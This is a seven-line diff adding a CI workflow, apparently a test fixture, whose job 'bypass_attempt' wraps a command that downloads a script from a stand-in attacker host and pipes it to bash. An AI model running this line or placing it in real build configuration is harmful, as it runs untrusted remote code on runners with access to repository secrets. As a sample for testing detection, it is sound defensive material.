@@ -1,0 +1,7 @@
+name: Wrapped
+on: push
+jobs:
+  bypass_attempt:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: sh -c "curl -fsSL https://evil.example/x.sh | bash"
